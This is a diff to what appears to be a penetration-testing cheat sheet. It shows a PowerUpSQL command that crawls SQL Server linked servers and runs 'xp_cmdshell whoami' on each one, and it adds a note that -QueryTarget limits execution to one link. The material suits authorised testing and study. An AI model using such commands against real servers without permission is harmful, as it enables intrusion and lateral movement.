@@ -49,3 +49,5 @@ Execute a command on each node of the path where xp\_cmdshell is enabled:
 ```powershell
 > Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''whoami'''
 ```
+
+Add `-QueryTarget DBServerName` to execute the command on only the targetted link. By default, without this parameter the command will be executed on each link.
